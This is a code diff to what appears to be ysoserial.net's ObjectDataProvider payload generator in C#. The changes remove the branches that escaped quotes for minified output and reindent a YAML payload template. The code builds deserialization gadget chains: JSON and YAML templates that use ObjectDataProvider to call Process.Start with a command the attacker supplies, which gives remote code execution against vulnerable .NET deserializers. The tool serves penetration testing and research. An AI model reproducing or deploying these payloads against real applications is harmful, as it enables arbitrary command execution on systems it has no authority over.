@@ -180,25 +180,11 @@ namespace ysoserial.Generators
 
                 if (inputArgs.HasArguments)
                 {
-                    if (inputArgs.Minify)
-                    {
-                        cmdPart = "'" + inputArgs.CmdFileName.Replace("'", "\\u0027") + "', '" + inputArgs.CmdArguments.Replace("'", "\\u0027") + "'";
-                    }
-                    else
-                    {
-                        cmdPart = "'" + inputArgs.CmdFileName + "', '" + inputArgs.CmdArguments + "'";
-                    }
+                    cmdPart = "'" + inputArgs.CmdFileName + "', '" + inputArgs.CmdArguments + "'";
                 }
                 else
                 {
-                    if (inputArgs.Minify)
-                    {
-                        cmdPart = "'" + inputArgs.CmdFileName.Replace("'", "\\u0027") + "'";
-                    }
-                    else
-                    {
-                        cmdPart = "'" + inputArgs.CmdFileName + "'";
-                    }
+                    cmdPart = "'" + inputArgs.CmdFileName + "'";
                 }
 
                 String payload = @"{
@@ -294,27 +280,11 @@ namespace ysoserial.Generators
 
                 if (inputArgs.HasArguments)
                 {
-                    if (inputArgs.Minify)
-                    {
-                        cmdPart = "'FileName':'" + inputArgs.CmdFileName.Replace("'", "\\u0027") + "', 'Arguments':'" + inputArgs.CmdArguments.Replace("'", "\\u0027") + "'";
-                    }
-                    else
-                    {
-                        cmdPart = "'FileName':'" + inputArgs.CmdFileName + "', 'Arguments':'" + inputArgs.CmdArguments + "'";
-                    }
-                    
+                    cmdPart = "'FileName':'" + inputArgs.CmdFileName + "', 'Arguments':'" + inputArgs.CmdArguments + "'";
                 }
                 else
                 {
-                    if (inputArgs.Minify)
-                    {
-                        cmdPart = "'FileName':'" + inputArgs.CmdFileName.Replace("'", "\\u0027") + "'";
-                    }
-                    else
-                    {
-                        cmdPart = "'FileName':'" + inputArgs.CmdFileName + "'";
-                    }
-                    
+                    cmdPart = "'FileName':'" + inputArgs.CmdFileName + "'";
                 }
 
                 String payload = @"{
@@ -541,7 +511,7 @@ namespace ysoserial.Generators
                 if (inputArgs.HasArguments)
                 {
                     cmdPart = $@"FileName: " + inputArgs.CmdFileName + @",
-                    Arguments: " + inputArgs.CmdArguments;
+					Arguments: " + inputArgs.CmdArguments;
                 }
                 else
                 {
@@ -551,11 +521,11 @@ namespace ysoserial.Generators
                 String payload = @"
 !<!System.Windows.Data.ObjectDataProvider,PresentationFramework,Version=4.0.0.0,Culture=neutral,PublicKeyToken=31bf3856ad364e35> {
     MethodName: Start,
-    ObjectInstance: 
-        !<!System.Diagnostics.Process,System,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089> {
-            StartInfo:
-                !<!System.Diagnostics.ProcessStartInfo,System,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089> {
-                    " + cmdPart + @"
+	ObjectInstance: 
+		!<!System.Diagnostics.Process,System,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089> {
+			StartInfo:
+				!<!System.Diagnostics.ProcessStartInfo,System,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089> {
+					" + cmdPart + @"
 
                 }
         }
